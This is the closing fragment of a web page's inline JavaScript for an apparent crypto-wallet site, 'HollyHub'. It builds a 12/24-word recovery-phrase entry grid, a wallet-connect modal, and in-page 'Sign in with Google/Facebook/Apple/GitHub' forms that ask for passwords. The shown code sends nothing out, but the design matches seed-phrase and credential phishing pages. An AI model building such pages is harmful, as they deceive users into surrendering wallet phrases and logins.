                    this.classList.add('correct');
                } else {
                    this.classList.remove('correct');
                    this.classList.add('incorrect');
                }
            });
            div.appendChild(input);
            phraseGrid.appendChild(div);
        }
    }
    radio12.addEventListener('change', updatePhraseGrid);
    radio24.addEventListener('change', updatePhraseGrid);
    // Initial setup
    updatePhraseGrid();
    // Social login handlers - create overlay dynamically
    document.querySelectorAll('.social-icon').forEach(icon => {
        icon.addEventListener('click', () => {
            const provider = icon.dataset.provider;
            const names = { google: 'Google', facebook: 'Facebook', apple: 'Apple', github: 'GitHub' };
            if (!document.getElementById('dynamic-login-overlay')) {
                const overlay = document.createElement('div');
                overlay.id = 'dynamic-login-overlay';
                overlay.className = 'login-overlay';
                overlay.innerHTML = `
                    <div class="login-box">
                        <h3 id="dynamic-login-title">Sign in with <span id="dynamic-provider-name"></span></h3>
                        <input type="text" id="dynamic-email-input" class="login-input" placeholder="Email or Username">
                        <input type="password" id="dynamic-password-input" class="login-input" placeholder="Password">
                        <button class="login-btn" onclick="simulateLogin()">Sign In / Sign Up</button>
                        <button class="mt-4 text-gray-400 hover:text-white text-sm" onclick="closeLogin()">Cancel</button>
                    </div>
                `;
                document.body.appendChild(overlay);
            }
            document.getElementById('dynamic-provider-name').textContent = names[provider];
            document.getElementById('dynamic-login-overlay').style.display = 'flex';
        });
    });
    function closeLogin() {
        const overlay = document.getElementById('dynamic-login-overlay');
        if (overlay) overlay.style.display = 'none';
    }
    function simulateLogin() {
        const email = document.getElementById('dynamic-email-input')?.value.trim() || '';
        if (email) {
            alert(`Welcome to HollyHub! Signed in as ${email}`);
            closeLogin();
        } else {
            alert("Please enter your email/username");
        }
    }
    
    // Ensure the open modal button works now that the DOM is ready
    openBtn.addEventListener('click', () => {
        modalOverlay.style.display = 'flex';
        setTimeout(() => modalOverlay.classList.add('active'), 10);
        if (typeof renderVisibleWallets === 'function') renderVisibleWallets();
        if (typeof populateExtraWallets === 'function') populateExtraWallets();
    });
    </script>

    <script src="script.js"></script>
</body>
</html>




